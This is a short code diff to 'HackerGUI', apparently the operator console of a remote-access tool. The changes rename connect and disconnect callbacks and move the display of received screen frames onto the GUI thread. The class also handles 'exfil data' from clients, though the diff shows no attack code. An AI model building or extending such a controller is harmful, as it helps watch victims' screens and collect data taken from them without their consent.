@@ -32,8 +32,8 @@ class HackerGUI:
         self._control_active = False
 
         self.server.set_callbacks(
-            on_client_connect=self._on_client_connect,
-            on_client_disconnect=self._on_client_disconnect,
+            on_connect=self._on_client_connect,
+            on_disconnect=self._on_client_disconnect,
             on_screen_frame=self._on_screen_frame,
             on_exfil_data=self._on_exfil_data,
         )
@@ -129,16 +129,21 @@ class HackerGUI:
             return
         try:
             img = Image.open(io.BytesIO(frame_data))
+            logger.info(f"Frame received: {len(frame_data)} bytes from {client_id}")
+            self.root.after(0, self._update_screen, img)
+        except Exception as e:
+            logger.error(f"Screen display error: {e}")
+
+    def _update_screen(self, img=None):
+        if img is not None:
             canvas_w = self.screen_canvas.winfo_width()
             canvas_h = self.screen_canvas.winfo_height()
             if canvas_w > 1 and canvas_h > 1:
                 img = img.resize((canvas_w, canvas_h), Image.Resampling.LANCZOS)
-            self._photo = ImageTk.PhotoImage(img)
-            self.root.after(0, self._update_screen)
-        except Exception as e:
-            logger.error(f"Screen display error: {e}")
-
-    def _update_screen(self):
+                self._photo = ImageTk.PhotoImage(img)
+            else:
+                self.root.after(50, self._update_screen, img)
+                return
         if self._photo:
             self.screen_canvas.delete("all")
             self.screen_canvas.create_image(0, 0, anchor="nw", image=self._photo)
